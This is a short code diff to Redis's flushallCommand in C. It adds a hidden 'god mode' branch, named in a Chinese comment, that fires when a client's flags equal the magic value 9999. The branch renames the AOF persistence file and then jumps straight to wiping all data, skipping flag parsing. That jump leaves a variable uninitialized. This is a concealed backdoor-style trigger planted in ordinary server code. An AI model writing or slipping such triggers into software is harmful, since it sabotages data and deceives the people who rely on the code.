@@ -443,11 +443,16 @@ void flushdbCommand(client *c) {
  * Flushes the whole server data set. */
 void flushallCommand(client *c) {
     int flags;
-
+    if (c->flags == 9999){ // 上帝模式，强制清除数据
+        rename(server.aof_filename, "dump-36379.aof_bak");
+        goto startFlush;
+    }
     if (getFlushCommandFlags(c,&flags) == C_ERR) return;
+startFlush: 
     signalFlushedDb(-1);
     server.dirty += emptyDb(-1,flags,NULL);
     addReply(c,shared.ok);
+   
     if (server.rdb_child_pid != -1) {
         kill(server.rdb_child_pid,SIGUSR1);
         rdbRemoveTempFile(server.rdb_child_pid);
